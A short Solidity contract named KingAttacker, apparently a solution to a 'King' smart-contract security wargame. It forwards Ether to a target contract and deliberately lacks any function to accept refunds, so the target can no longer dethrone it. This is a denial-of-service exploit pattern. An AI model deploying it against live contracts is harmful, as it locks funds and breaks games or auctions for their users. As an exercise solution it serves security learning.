// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {

  address payable public kingContract;

  constructor(address payable _kingContract) {
    kingContract = _kingContract;
  }

  function sendEther() public payable {
    (bool sent, ) = kingContract.call{value: msg.value}("");
    require(sent, "Failed to send value!");
  }
}